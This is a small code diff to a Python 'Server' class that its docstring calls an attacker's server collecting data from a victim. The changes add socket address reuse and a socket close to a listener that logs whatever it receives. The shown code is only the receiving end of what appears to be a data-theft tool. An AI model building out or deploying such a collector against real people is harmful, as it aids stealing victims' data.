@@ -6,7 +6,6 @@
 import logging
 import socket
 
-
 class Server:
     """ This class represents a server of the attacker that
     collects data from the victim.
@@ -34,6 +33,7 @@ class Server:
     def initialize(self):
         """ Initialize server before session. """
         try:
+            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             self.socket.bind(('192.168.10.102', self._port))
             self.socket.listen()
             logging.debug('Server was successfully initialized.')
@@ -53,6 +53,7 @@ class Server:
                 if not data:
                     break
                 logging.info(data)
+            self.socket.close()
 
 
 if __name__ == '__main__':
